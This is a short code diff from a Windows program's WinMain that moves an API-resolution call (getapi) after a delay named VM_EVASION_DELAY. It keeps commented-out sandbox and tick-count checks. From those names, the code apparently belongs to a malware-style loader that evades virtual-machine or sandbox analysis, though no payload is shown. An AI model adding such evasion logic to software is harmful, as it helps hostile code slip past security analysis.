@@ -119,13 +119,14 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 	}
 #endif
 	int ret = 0;
-	ret = getapi();
 
 	ret = VM::delay(VM_EVASION_DELAY);
 	if (ret < 0) {
 		return -1;
 	}
 	//VM::checkTickCount();
+
+	ret = getapi();
 
 	//VM::checkSandbox();
 
